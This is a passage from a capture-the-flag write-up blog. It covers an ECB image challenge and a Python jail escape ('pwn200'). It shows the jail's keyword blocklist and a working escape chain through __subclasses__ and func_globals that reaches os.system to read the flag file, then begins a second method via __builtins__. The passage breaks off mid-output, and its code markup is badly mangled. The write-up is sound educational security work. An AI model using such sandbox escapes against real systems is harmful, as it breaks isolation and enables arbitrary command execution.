-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>python colorbook.py -x <span class="m">3840</span> ecb.bmp</code></pre></div></p>
-
-<p>The image is still a bit mangled, but after flipping the image vertically, the flag is legible:</p>
-
-<p><img src="/assets/cry300.png" alt="" /></p>
-
-<p><code>flag{no_penguin_here}</code></p>
-
-<h1>pwn200</h1>
-
-<p>A python jail! This reminded me of the CSAW python jail, but simpler. Upon connecting to the ip address, the user is dropped in a python shell. However, we can&rsquo;t use commands that contain</p>
-
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">prohibited_keywords</span> <span class="o">=</span> <span class="p">[</span>
-        <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">import</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
-        <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nb">open</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
-        <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">flag</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
-        <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nb">eval</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
-        <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="k">exec</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-    <span class="p">]</span></code></pre></div></p>
-
-<p>Now, we wanna read the flag somehow. I found <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">this writeup</a> to be very helpful. I followed that approach, abusing <code>().__class__.__base__.__subclasses__()</code> to finally call <code>os</code>. I still have no profound understanding of breaking python jails, but this and the CSAW example definitely helped.</p>
-
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="mf">54.69</span><span class="o">.</span><span class="mf">118.120</span> <span class="mi">6000</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Safe</span> <span class="n">Interactive</span> <span class="n">CPython</span> <span class="n">Shell</span> <span class="p">(</span><span class="n">SICS</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Rules</span><span class="p">:</span>
-    <span class="o">-</span> <span class="n">Wash</span> <span class="n">your</span> <span class="n">dishes</span>
-    <span class="o">-</span> <span class="n">Don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">eat</span> <span class="n">the</span> <span class="n">yellow</span> <span class="n">snow</span>
-    <span class="o">-</span> <span class="n">Do</span> <span class="ow">not</span> <span class="kn">import</span> <span class="nn">anything</span>
-    <span class="o">-</span> <span class="n">No</span> <span class="n">peeking</span> <span class="n">at</span> <span class="n">files</span><span class="err">!</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
-<span class="p">()</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">class</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">base</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">subclasses</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">()</span>
-<span class="p">[</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;type&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakref&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakcallableproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;weakproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;int&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;basestring&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;bytearray&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;list&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NoneType&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;NotImplementedType&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;traceback&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;super&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;xrange&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;dict&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;set&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;slice&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;staticmethod&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;complex&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;float&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;buffer&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;long&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;frozenset&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;property&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;tuple&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;enumerate&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;reversed&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;code&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;frame&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;builtin_function_or_method&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;instancemethod&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;function&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;classobj&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;dictproxy&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;generator&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;getset_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;wrapper_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;instance&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;ellipsis&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;member_descriptor&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;sys.floatinfo&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;EncodingMap&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;sys.flags&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;exceptions.BaseException&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;module&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;imp.NullImporter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;zipimport.zipimporter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;posix.stat_result&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s">&#39;posix.statvfs_result&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">warnings</span><span class="o">.</span><span class="n">WarningMessage</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Hashable</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="nb">classmethod</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Iterable</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Sized</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Container</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">_abcoll</span><span class="o">.</span><span class="n">Callable</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">_Printer</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">_Helper</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="n">pwd</span><span class="o">.</span><span class="n">struct_passwd</span><span class="s">&#39;&gt;, &lt;type &#39;</span><span class="nb">file</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">site</span><span class="o">.</span><span class="n">Quitter</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalEncoder</span><span class="s">&#39;&gt;, &lt;class &#39;</span><span class="n">codecs</span><span class="o">.</span><span class="n">IncrementalDecoder</span><span class="s">&#39;&gt;]</span>
-<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
-<span class="p">()</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">class</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">base</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">subclasses</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span>
-<span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="s">&#39;&gt;</span>
-<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
-<span class="p">()</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">class</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">base</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">subclasses</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">init</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.</span><span class="n">func_globals</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">linecache</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="nb">dict</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">os</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pybaby</span><span class="o">/</span><span class="n">flag</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">rekt</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
-<span class="p">()</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">class</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">base</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">subclasses</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">init</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.</span><span class="n">func_globals</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">linecache</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="nb">dict</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">os</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pybaby</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">rekt</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
-<span class="p">()</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">class</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">base</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">subclasses</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">()[</span><span class="mi">49</span><span class="p">]</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">init</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.</span><span class="n">func_globals</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">linecache</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span><span class="o">.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="nb">dict</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">os</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pybaby</span><span class="o">/</span><span class="n">f</span><span class="o">*&amp;</span><span class="n">rsquo</span><span class="p">;)</span>  <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
-<span class="n">flag</span><span class="p">{</span><span class="n">python_sandboxing</span><span class="p">:</span><span class="n">_harder_than_teaching_your_mom_dota</span><span class="p">}</span><span class="mi">0</span></code></pre></div></p>
-
-<p><code>flag{python_sandboxing:_harder_than_teaching_your_mom_dota}</code></p>
-
-<p>I just figured out another way to beat this one, using <code>__builtins__</code>. First, we need to get a way to call <code>open</code> without actually using the phrase &lsquo;open&rsquo;. We can display all the builtin functions like so:</p>
-
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">builtins</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="nb">dict</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.</span><span class="n">keys</span><span class="p">()</span>
-<span class="n">baby</span><span class="nd">@sics</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">[</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">bytearray</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">IndexError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">all</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">help</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">vars</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">SyntaxError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">unicode</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UnicodeDecodeError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">isinstance</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">copyright</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">NameError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">BytesWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">dict</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">input</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">oct</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">bin</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">SystemExit</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">StandardError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">format</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">repr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">sorted</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="bp">False</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">RuntimeWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">list</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">iter</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">reload</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">Warning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">package</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">round</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">dir</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">cmp</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">set</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">bytes</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">reduce</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">intern</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">issubclass</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="bp">Ellipsis</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">EOFError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">locals</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">BufferError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">slice</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">FloatingPointError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">sum</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">getattr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">abs</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">exit</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="k">print</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="bp">True</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">FutureWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">ImportWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="bp">None</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">hash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">ReferenceError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">len</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">credits</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">frozenset</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">ord</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">super</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">TypeError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">license</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">KeyboardInterrupt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UserWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">filter</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span 